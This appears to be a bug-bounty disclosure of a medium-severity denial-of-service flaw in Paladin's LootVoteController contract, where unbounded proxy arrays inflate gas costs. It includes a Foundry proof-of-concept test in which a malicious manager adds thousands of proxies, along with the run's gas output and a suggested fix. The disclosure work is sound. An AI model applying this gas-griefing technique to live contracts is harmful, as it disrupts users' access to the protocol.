# [M] Unbounded proxy length in LootVoteController can cause function to become unusable

## Summary
Severity: Medium
Chain: Smart contract
Component: Paladin
Published: 2024-02-17
Source: https://github.com/hats-finance/Paladin-0x1610bfde27e57b068af7f38aec3d2a7b1d146989/issues/64
Type: hats-finding

## Details
**Github username:** @erictee2802
**Twitter username:** 0xEricTee
**Submission hash (on-chain):** 0x3ae2c165fcb7496616237c22e0f59abef3e4fedfb12d62aeafc904082777fb2f
**Severity:** medium

**Description:**
**Description**\

The proxy length in `LootVoteController.sol` is unbounded, and the length of proxy is looped in `LootVoteController::_clearExpiredProxies`.  Each time the function `LootVoteController::setVoterProxy` is called, a new proxy will be added to the `currentUserProxyVoters` array. If at some point there are now a large number of `proxies`, iterating over them will become very costly and can result in a gas cost that is over the block gas limit. This will mean that a transaction cannot be executed anymore, causing these functions in a state of DoS.




**Attack Scenario**\

Looping over unbounded array can result in a state of DoS.

**Attachments**

NA

1. **Proof of Concept (PoC) File**
<!-- You must provide a file containing a proof of concept (PoC) that demonstrates the vulnerability you have discovered. -->

- Install foundry.

- Rename the original test folder to `typescript-test` and create a new folder name `test`.

- Add `forge-std` module to lib with command: `git submodule add https://github.com/foundry-rs/forge-std lib/forge-std`

- Add `remappings.txt` file in `Vote-Flywheel` folder with the following content:
```
@ensdomains/=node_modules/@ensdomains/
@nomiclabs/=node_modules/@nomiclabs/
@openzeppelin/=node_modules/@openzeppelin/
@solidity-parser/=node_modules/@solidity-parser/
ds-test/=lib/forge-std/lib/ds-test/src/
eth-gas-reporter/=node_modules/eth-gas-reporter/
forge-std/=lib/forge-std/src/
hardhat/=node_modules/hardhat/
```

- Add`LootVoteController.t.sol` file within the `test` folder with the following content:

```javascript
pragma solidity 0.8.20;

import {LootVoteController} from "../LootVoteController.sol";
import {Test, console} from "forge-std/Test.sol";
import {HolyPalPower} from "../HolyPalPower.sol";
 
contract HolyPaladinToken {
    	struct UserLock {
        // Amount of locked balance
        uint128 amount; // safe because PAL max supply is 10M tokens
        // Start of the Lock
        uint48 startTimestamp;
        // Duration of the Lock
        uint48 duration;
        // BlockNumber for the Lock
        uint32 fromBlock; // because we want to search by block number
    }

    struct TotalLock {
        // Total locked Supply
        uint224 total;
        // BlockNumber for the last update
        uint32 fromBlock;
    }

    function getUserLock(address user) external view returns (UserLock memory) {
        return UserLock(1,1708151785,604800, 19245756); // DUMMY VALUE AS THIS IS FOR TESTING PURPOSE ONLY.
    }

}


contract LootVoteControllerTest is Test {

    LootVoteController public controller;
    address public user;
    address public malicious_manager;
    address public benign_manager;
    HolyPalPower public _hPalPower;
    HolyPaladinToken public hPal;


    function setUp() public {
        hPal = new HolyPaladinToken();
        _hPalPower = new HolyPalPower(address(hPal)); 
        user = makeAddr("USER"); // Dummy user for testing.
        malicious_manager = makeAddr("MALICIOUS_MANAGER");
        benign_manager = makeAddr("BENIGN_MANAGER"); 
        controller = new LootVoteController(address(_hPalPower));


    }
    
    function test_DOSinSetVoterProxy() public {
        vm.startPrank(user);
        controller.approveProxyManager(benign_manager);
        controller.approveProxyManager(malicious_manager);
        vm.stopPrank();

        vm.startPrank(malicious_manager);
        uint256 WEEK = 604800;

        for (uint i; i <= 5000; i++ ) {
            controller.setVoterProxy(user, address(uint160(i + 1)), 1, block.timestamp + WEEK);
        }

        vm.stopPrank();

        vm.startPrank(benign_manager);
        uint gasBefore = gasleft();

        controller.setVoterProxy(user,address(0x666),1,block.timestamp + WEEK);
        uint gasAfter = gasleft();

        console.log("Gas Used for calling setVoterProxy: ", gasBefore - gasAfter);
        vm.stopPrank();
       
    }



   

}
```
- Run the test with command : ` forge test --match-test test_DOSinSetVoterProxy -vv`:

Foundry Result:

```javascript
Running 1 test for contracts/test/LootVoteController.t.sol:LootVoteControllerTest
[PASS] test_DOSinSetVoterProxy() (gas: 8775765976)
Logs:
  Gas Used for calling setVoterProxy:  3451669

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 74.51s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
mac@macs-MacBook-Pro Vote-Flywheel % 
```


2. **Revised Code File (Optional)**
<!-- If possible, please provide a second file containing the revised code that offers a potential fix for the vulnerability. This file should include the following information:
- Comment with a clear explanation of the proposed fix.
- The revised code with your suggested changes.
- Any additional comments or explanations that clarify how the fix addresses the vulnerability. -->

Consider setting a upper bound of `proxy` that an approved manager can add. Additionally, consider allow users to disapprove previously approved managers  in case they try to act maliciously.
